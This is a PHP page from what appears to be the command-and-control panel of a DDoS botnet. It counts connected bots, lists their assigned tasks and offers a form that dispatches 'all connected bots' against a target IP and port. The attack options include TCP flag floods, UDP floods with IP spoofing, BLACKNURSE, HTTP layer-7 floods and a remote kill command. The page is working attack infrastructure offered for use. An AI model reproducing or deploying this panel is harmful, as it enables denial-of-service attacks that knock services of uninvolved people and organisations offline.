<?php
# Necessary at the top of every page for session management
session_start();

# If the RAT user isn't authenticated
if (!isset($_SESSION["authenticated"])) {
	# Redirects them to 403.php page
	header("Location: 403.php");
}
# Else they are authenticated
else {
	# Includes the configuration file
	include "config/config.php";

	# Establishes a connection to the RAT database
	# Uses variables from "config/config.php"
	# "SET NAMES utf8" is necessary to be Unicode-friendly
	$dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));
}
?>
<!DOCTYPE html>
<html>

<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
	<title>Table - Brand</title>
	<link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i">
	<link rel="stylesheet" href="assets/fonts/fontawesome-all.min.css">
	<link rel="stylesheet" href="assets/fonts/font-awesome.min.css">
	<link rel="stylesheet" href="assets/fonts/fontawesome5-overrides.min.css">
	<script src="assets/js/fulkter.js"></script>
</head>

<body id="page-top">
	<div id="wrapper">
		<nav class="navbar navbar-dark align-items-start sidebar sidebar-dark accordion bg-gradient-primary p-0" style="background: #23272a;">
			<div class="container-fluid d-flex flex-column p-0">
				<a class="navbar-brand d-flex justify-content-center align-items-center sidebar-brand m-0" href="index.php">
					<div class="sidebar-brand-icon rotate-n-15"><i class="fas fa-network-wired"></i></div>
					<div class="sidebar-brand-text mx-3"><span>P - X .Net</span></div>
				</a>
				<hr class="sidebar-divider my-0">
				<ul class="nav navbar-nav text-light" id="accordionSidebar">
					<li class="nav-item"><a class="nav-link" href="index.php"><i class="fas fa-tachometer-alt"></i><span>&nbsp; Dashboard</span></a></li>
					<li class="nav-item"><a class="nav-link" href="hosts.php"><i class="fas fa-user"></i><span>&nbsp; Bot</span></a></li>
					<li class="nav-item"><a class="nav-link active" href="tasks.php"><i class="fas fa-table"></i><span>&nbsp; Task</span></a></li>
					<li class="nav-item"><a class="nav-link" href="output.php"><i class="fas fa-exclamation-circle"></i><span>&nbsp; Log</span></a></li>
					<li class="nav-item"><a class="nav-link" href="account.php"><i class="fas fa-window-maximize"></i><span>&nbsp; Account Management</span></a><a class="nav-link" href="network.php"><i class="fa fa-eercast"></i><span>&nbsp; Network Management</span></a></li>
				</ul>
				<div class="text-center d-none d-md-inline"><button class="btn rounded-circle border-0" id="sidebarToggle" type="button"></button></div>
			</div>
		</nav>
		<div class="d-flex flex-column" id="content-wrapper" style="background: #2c2f33;">
			<div id="content-fluid">
				<nav class="navbar navbar-expand shadow topbar static-top" style="background: #2c2f33;">
					<div class="container-fluid"><button class="btn btn-link d-md-none rounded-circle mr-3" id="sidebarToggleTop" type="button"><i class="fas fa-bars"></i></button>
						<form class="d-none d-sm-inline-block me-auto ms-md-3 my-2 my-md-0 mw-100 navbar-search">
							<div class="input-group"></div>
						</form>
						<ul class="navbar-nav flex-nowrap ms-auto">
							<li class="nav-item dropdown d-sm-none no-arrow"><a class="dropdown-toggle nav-link" aria-expanded="false" data-bs-toggle="dropdown" href="#"><i class="fas fa-search"></i></a>
								<div class="dropdown-menu dropdown-menu-end p-3 animated--grow-in" aria-labelledby="searchDropdown">
									<form class="me-auto navbar-search w-100">
										<div class="input-group"><input class="bg-light form-control border-0 small" type="text" placeholder="Search for ...">
											<div class="input-group-append"><button class="btn btn-primary py-0" type="button"><i class="fas fa-search"></i></button></div>
										</div>
									</form>
								</div>
							</li>
							<li class="nav-item dropdown no-arrow mx-1">
								<div class="nav-item dropdown no-arrow"><a class="dropdown-toggle nav-link" aria-expanded="false" data-bs-toggle="dropdown" href="#"><span class="badge bg-danger badge-counter"></span></a>
									<div class="dropdown-menu dropdown-menu-end dropdown-list animated--grow-in">
										<h6 class="dropdown-header">alerts center</h6><a class="dropdown-item d-flex align-items-center" href="#">
											<div class="me-3">
												<div class="bg-primary icon-circle"><i class="fas fa-file-alt text-white"></i></div>
											</div>
											<div><span class="small text-gray-500">December 12, 2019</span>
												<p>A new monthly report is ready to download!</p>
											</div>
										</a><a class="dropdown-item d-flex align-items-center" href="#">
											<div class="me-3">
												<div class="bg-success icon-circle"><i class="fas fa-donate text-white"></i></div>
											</div>
											<div><span class="small text-gray-500">December 7, 2019</span>
												<p>$290.29 has been deposited into your account!</p>
											</div>
										</a><a class="dropdown-item d-flex align-items-center" href="#">
											<div class="me-3">
												<div class="bg-warning icon-circle"><i class="fas fa-exclamation-triangle text-white"></i></div>
											</div>
											<div><span class="small text-gray-500">December 2, 2019</span>
												<p>Spending Alert: We've noticed unusually high spending for your account.</p>
											</div>
										</a><a class="dropdown-item text-center small text-gray-500" href="#">Show All Alerts</a>
									</div>
								</div>
							</li>
							<li class="nav-item dropdown no-arrow mx-1">
								<div class="nav-item dropdown no-arrow"><a class="dropdown-toggle nav-link" aria-expanded="false" data-bs-toggle="dropdown" href="#"></a>
									<div class="dropdown-menu dropdown-menu-end dropdown-list animated--grow-in">
										<h6 class="dropdown-header">alerts center</h6><a class="dropdown-item d-flex align-items-center" href="#">
											<div class="dropdown-list-image me-3"><img class="rounded-circle" src="assets/img/avatars/avatar4.jpeg">
												<div class="bg-success status-indicator"></div>
											</div>
											<div class="fw-bold">
												<div class="text-truncate"><span>Hi there! I am wondering if you can help me with a problem I've been having.</span></div>
												<p class="small text-gray-500 mb-0">Emily Fowler - 58m</p>
											</div>
										</a><a class="dropdown-item d-flex align-items-center" href="#">
											<div class="dropdown-list-image me-3"><img class="rounded-circle" src="assets/img/avatars/avatar2.jpeg">
												<div class="status-indicator"></div>
											</div>
											<div class="fw-bold">
												<div class="text-truncate"><span>I have the photos that you ordered last month!</span></div>
												<p class="small text-gray-500 mb-0">Jae Chun - 1d</p>
											</div>
										</a><a class="dropdown-item d-flex align-items-center" href="#">
											<div class="dropdown-list-image me-3"><img class="rounded-circle" src="assets/img/avatars/avatar3.jpeg">
												<div class="bg-warning status-indicator"></div>
											</div>
											<div class="fw-bold">
												<div class="text-truncate"><span>Last month's report looks great, I am very happy with the progress so far, keep up the good work!</span></div>
												<p class="small text-gray-500 mb-0">Morgan Alvarez - 2d</p>
											</div>
										</a><a class="dropdown-item d-flex align-items-center" href="#">
											<div class="dropdown-list-image me-3"><img class="rounded-circle" src="assets/img/avatars/avatar5.jpeg">
												<div class="bg-success status-indicator"></div>
											</div>
											<div class="fw-bold">
												<div class="text-truncate"><span>Am I a good boy? The reason I ask is because someone told me that people say this to all dogs, even if they aren't good...</span></div>
												<p class="small text-gray-500 mb-0">Chicken the Dog · 2w</p>
											</div>
										</a><a class="dropdown-item text-center small text-gray-500" href="#">Show All Alerts</a>
									</div>
								</div>
								<div class="shadow dropdown-list dropdown-menu dropdown-menu-end" aria-labelledby="alertsDropdown"></div>
							</li>
							<li class="nav-item dropdown no-arrow">
								<div class="nav-item dropdown no-arrow"><a class="dropdown-toggle nav-link" aria-expanded="false" data-bs-toggle="dropdown" href="#"><span class="d-none d-lg-inline me-2 text-gray-600 small"><?php echo $_SESSION["username"] ?></span></a>
									<div class="dropdown-menu shadow dropdown-menu-end animated--grow-in"><a class="dropdown-item" href="#"><i class="fas fa-user fa-sm fa-fw me-2 text-gray-400"></i>&nbsp;Profile</a><a class="dropdown-item" href="#"><i class="fas fa-cogs fa-sm fa-fw me-2 text-gray-400"></i>&nbsp;Settings</a><a class="dropdown-item" href="#"><i class="fas fa-list fa-sm fa-fw me-2 text-gray-400"></i>&nbsp;Activity log</a>
										<div class="dropdown-divider"></div><a class="dropdown-item" href="#"><i class="fas fa-sign-out-alt fa-sm fa-fw me-2 text-gray-400"></i>&nbsp;Logout</a>
									</div>
								</div>
							</li>
						</ul>
					</div>
				</nav>
				<div class="container-fluid">
					<h3 class="text-dark mb-4 text-white">Task</h3>
					<div class="card shadow">
						<div class="card-header py-3">
							<p class="text-primary m-0 fw-bold">Pending tasks</p>
						</div>
						<div class="card-body">
							<div class="row">
								<div class="col-md-9 text-nowrap">
									<?php
									$statement = $dbConnection->prepare("SELECT * FROM hosts where status = 'connected'");
									$statement->execute();

									$bot = $statement->rowCount();
									$statement = $dbConnection->prepare("SELECT * FROM hosts");
									$statement->execute();

									$botoffline = $statement->rowCount();
									?>
									<p id="botconnected">Connected: <?php echo $bot, "/", $botoffline; ?></p>
								</div>
								<div class="col-md-3">
									<div class="text-md-right dataTables_filter" id="dataTable_filter"><label><input type="search" class="form-control form-control-sm" aria-controls="dataTable" placeholder="Search" name="search_input" id="search_input" onkeyup="fulkter()"></label></div>
								</div>
							</div>
							<div class="table-responsive table mt-2" id="dataTable" role="grid" aria-describedby="dataTable_info">
								<table class="table my-0" id="tasksTable">
									<thead>
										<tr>
											<th>Task ID</th>
											<th>Tasked By</th>
											<th>Hostname</th>
											<th>Task Action</th>
											<th>Task Secondary</th>
										</tr>
									</thead>
									<tbody id="table_body">
										<?php
										# Gets a list of all of tasks
										# This information will be used to build a HTML table
										$statement = $dbConnection->prepare("SELECT id, user, hostname, action, secondary FROM tasks");
										$statement->execute();
										$results = $statement->fetchAll();

										# Kills database connection
										$statement->connection = null;

										# Builds HTML table for each host in the "tasks" table
										foreach ($results as $row) {
											echo "<tr>"; # Start of HTML table row
											echo "<th>" . $row["id"] . "&ensp;&ensp;<a type='submit' class='btn btn-danger btn-xs' href='deleteTask.php?id=" . $row["id"] . "'>Delete Task</a></th>";
											echo "<td>" . $row["user"] . "</th>";
											echo "<th class='hostname'>" . $row["hostname"] . "</th>";
											echo "<th>" . $row["action"] . "</th>";
											echo "<th>" . $row["secondary"] . "</th>";
											echo "</tr>"; # End of HTML table row
										}
										?>
									</tbody>
									<tfoot>
										<tr>
											<th><strong>Task ID</strong></th>
											<th><strong>Tasked By</strong></th>
											<th><strong>Hostname</strong></th>
											<th><strong>Task Action</strong></th>
											<th><strong>Task Secondary</strong></th>
										</tr>
									</tfoot>
								</table>
							</div>

							<!--Run task-->
							<div class="row">

								<div class="col-4">
									<select class="form-select mb-1" name="seltask" onchange="showDiv(this)">
										<option value="" disabled selected>Choose option</option>
										<option value="" disabled>--------L.3--------</option>
										<option value="BLACKNURSE">BLACKNURSE</option>
										<option value="" disabled>--------L.4--------</option>
										<option value="TCP">TCP</option>
										<option value="UDP">UDP</option>
										<option value="UDPRAW">UDPRAW</option>
										<option value="UDPPPS">UDPPPS</option>
										<option value="UNKNOWN">Unknown</option>
										<option value="XTDCUSTOM">XTDCustom</option>
										<option value="HOLD">hold</option>
										<option value="JUNK">junk</option>
										<option value="RANDHEX">RandHex</option>
										<option value="STD">STD</option>
										<option value="" disabled>--------L.7--------</option>
										<option value="HTTPSOCKET">HTTPSOCKET</option>
										<option value="HTTP">HTTP</option>
										<option value="OVHL7">OVHL7</option>
										<option value="" disabled>--------MANAGEMENT--------</option>
										<option value="KILL">KILL</option>
									</select>
								</div>


								<!-- Start of task form -->
								<div class="container" style="display: none;" id="frm">
							<br>
							<form role="form" class="form-inline" method="post" action="createTask.php">
							<input hidden value="" name="seltask" id="seltask">
							<div class="row">
								<div class="col-6">
								<select class="form-select mb-1" name="hostname">
									<option value="" disabled selected>Choose option</option>
									<option value="all connected bots">all connected bots</option>
								</select>
								</div>
								<div class="col-6">
								<div id="stdfrm" style="display: none;">
									<input type="text" class="form-control mb-1" name="ip" id="ip" placeholder="ip or FQDN (without http(s):// or slash)">
									<input type="text" class="form-control mb-1" name="port" id="port" placeholder="port">
									<input type="text" class="form-control mb-1" name="time" id="time" placeholder="time (seconds)">
								</div>
								<div id="httpfrm" style="display: none;">
									<input type="text" class="form-control mb-1" name="path" placeholder="path">
									<select class="form-select mb-1" name="method">
									<option value="" disabled selected>Choose option</option>
									<option value="GET">GET</option>
									<option value="POST">POST</option>
									<option value="HEAD">HEAD</option>
									<option value="CONNECT">CONNECT</option>
									</select>
								</div>
								<div id="killfrm" style="display: none;">
									<input type="text" class="form-control mb-1" name="killpassword">
								</div>
								<div id="powerfrm" style="display: none;">
								<label for="power" class="form-label">Power : <span id="powerlabel">10</span></label>
								<input type="range" name="power" value="10" class="form-range" min="10" max="100" step="1" id="power">
								</div>

								<script>
								const powerRange = document.getElementById('power');
								const powerLabel = document.getElementById('powerlabel');

								powerRange.addEventListener('input', () => {
									powerLabel.textContent = powerRange.value;
								});
								</script>
								<div id="tcpfrm" style="display: none;">
									<label class="form-label">Methods :</label>
									<input class="form-check-input" type="checkbox" value="syn" name="checkboxes[]">
									<label class="form-check-label" for="flexCheckDefault">syn</label>&nbsp;
									<input class="form-check-input" type="checkbox" value="rst" name="checkboxes[]">
									<label class="form-check-label" for="flexCheckDefault">rst</label>&nbsp;
									<input class="form-check-input" type="checkbox" value="fin" name="checkboxes[]">
									<label class="form-check-label" for="flexCheckDefault">fin</label>&nbsp;
									<input class="form-check-input" type="checkbox" value="ack" name="checkboxes[]">
									<label class="form-check-label" for="flexCheckDefault">ack</label>&nbsp;
									<input class="form-check-input" type="checkbox" value="psh" name="checkboxes[]">
									<label class="form-check-label" for="flexCheckDefault">psh</label>
								</div>
								<div id="udpfrm" style="display: none;">
									<input class="form-check-input" type="checkbox" value="spoofit" name="spoofit">
									<label class="form-check-label" for="flexCheckDefault">Spoofit</label><br>
									<label for="packetsize" class="form-label">PacketSize : <span id="packetsizelabel">1</span></label>
									<input type="range" name="packetsize" value="1" class="form-range" min="1" max="1023" step="1" id="packetsize">
								</div>
								<div id="udpppsfrm" style="display: none;">
									<label for="ppspacketsize" class="form-label">PacketSize : <span id="ppspacketsizelabel">2</span></label>
									<input type="range" name="ppspacketsize" value="2" class="form-range" min="2" max="100" step="1" id="ppspacketsize">
								</div>
								</div>
								<button type="submit" name="submit" class="btn btn-default" id="submit-btn">Submit</button>
							</div>
							</form>
							<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
							<script>
							</script>
							</div>
								<!-- End of task form -->
							</div>
						</div><a class="border rounded d-inline scroll-to-top" href="#page-top"><i class="fas fa-angle-up"></i></a>
					</div>
					<script src="assets/js/jquery.min.js"></script>
					<script src="assets/bootstrap/js/bootstrap.min.js"></script>
					<script src="assets/js/chart.min.js"></script>
					<script src="assets/js/bs-init.js"></script>
					<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.4.1/jquery.easing.js"></script>
					<script src="assets/js/theme.js"></script>
					<script type="text/javascript">
						function showDiv(select) {
							const displaySettings = {
								'HTTP': {
									'stdfrm': 'block',
									'httpfrm': 'block',
									'powerfrm': 'block',
									'udpppsfrm': 'none',
									'killfrm': 'none',
									'udpfrm': 'none',
									'tcpfrm': 'none'
								},
								'HTTPS': {
									'stdfrm': 'block',
									'httpfrm': 'block',
									'powerfrm': 'block',
									'udpppsfrm': 'none',
									'killfrm': 'none',
									'udpfrm': 'none',
									'tcpfrm': 'none'
								},
								'BLACKNURSE': {
									'stdfrm': 'block',
									'httpfrm': 'none',
									'powerfrm': 'none',
									'udpppsfrm': 'none',
									'killfrm': 'none',
									'udpfrm': 'none',
									'tcpfrm': 'none',
								},
								'PPS': {
									'stdfrm': 'block',
									'httpfrm': 'none',
									'powerfrm': 'block',
									'udpppsfrm': 'none',
									'killfrm': 'none',
									'udpfrm': 'none',
									'tcpfrm': 'none'
								},
								'UDPPPS': {
									'stdfrm': 'block',
									'httpfrm': 'none',
									'powerfrm': 'none',
									'udpppsfrm': 'block',
									'killfrm': 'none',
									'udpfrm': 'none',
									'tcpfrm': 'none'
								},
								'UDP': {
									'stdfrm': 'block',
									'httpfrm': 'none',
									'powerfrm': 'none',
									'udpppsfrm': 'none',
									'killfrm': 'none',
									'udpfrm': 'block',
									'tcpfrm': 'none'
								},
								'KILL': {
									'stdfrm': 'none',
									'httpfrm': 'none',
									'powerfrm': 'none',
									'udpppsfrm': 'none',
									'killfrm': 'block',
									'udpfrm': 'none',
									'tcpfrm': 'none'
								},
								'TCP': {
									'stdfrm': 'block',
									'httpfrm': 'none',
									'powerfrm': 'none',
									'udpppsfrm': 'none',
									'killfrm': 'none',
									'udpfrm': 'block',
									'tcpfrm': 'block'
								},
								'': {
									'stdfrm': 'block',
									'httpfrm': 'none',
									'powerfrm': 'none',
									'udpppsfrm': 'none',
									'killfrm': 'none',
									'udpfrm': 'none',
									'tcpfrm': 'none'
								}
							};

							if (select.value !== '') {
								document.getElementById('frm').style.display = 'block';
								document.getElementById('seltask').value = select.value;

								const settings = displaySettings[select.value] || displaySettings[''];

								for (const key in settings) {
									document.getElementById(key).style.display = settings[key];
								}
							}
						}
					</script>
				</div>
			</div>
			<footer class="sticky-footer" style="background: #2c2f33;">
				<div class="container my-auto">
					<div class="text-center my-auto copyright"><span>Copyright © Brand 2022</span></div>
				</div>
			</footer>
		</div><a class="border rounded d-inline scroll-to-top" href="#page-top"><i class="fas fa-angle-up"></i></a>
	</div>
	<script src="assets/bootstrap/js/bootstrap.min.js"></script>
	<script src="assets/js/script.min.js"></script>
</body>

</html>